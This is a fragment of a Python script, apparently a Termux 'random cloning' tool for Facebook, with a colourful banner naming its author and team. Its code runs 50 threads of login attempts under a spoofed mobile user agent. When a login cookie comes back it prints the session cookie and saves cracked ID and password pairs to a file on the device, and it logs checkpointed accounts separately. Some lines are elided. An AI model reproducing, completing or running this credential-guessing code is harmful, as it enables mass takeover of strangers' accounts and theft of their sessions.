...
logo = ("""
 ...
 \033[1;93m|     \033[1;96m[✓] CREATED BY\33[0;m   :  \033[1;96mTASFIYA ISLAM            \033[1;93m|
 \033[1;93m|     \033[1;32m[✓] FACEBOK      : \033[1;34m TASFIYA JAHAN AJMERY\033[1;93m|
 \033[1;93m|     \033[1;35m[✓] GITHUB       :  \033[1;35mTASFIYA-ISLAM            \033[1;93m|
 \033[1;93m|     \033[1;36m[✓] TOOL STATUS  : \033[1;36m Random Cloning Bd        \033[1;93m|
 \033[1;93m|     \033[1;35m[✓] TEAM         :  \033[1;35mBK HUNRER TEAM         \033[1;93m|
 \033[1;93m|     \033[1;36m[✓] TOOL VIRSION :  \033[1;36m0.0                      \033[1;93m|
 \033[1;93m×××××××××××××××××\033[1;93m×××××××××××××××\033[1;93m××××××××××××××××××××
 \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m DONT CLONE ID ....
 \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m TASFIYA TERMUX HELPING ZONE....
 \033[1;93m××××××××××××××××\033[1;93m×××××××××××××××\033[1;93m××××××××××××××××××""")
def linex():
	print('\033[1;93m ×××××××××××××××××××××××××××××××××××××××××××××××××')
loop = 0
...
def xxr():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m TOOL OWNER \033[1;97m: \033[1;96m TASFIYA ISLAM')
    ...
    try:
        ...
        'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m [TASFIYA-OK💉] ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie 🍪= \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/TASFIYA-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;31m [TASFIYA-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/TASFIYA-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{xr}TASFIYA-VAI{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
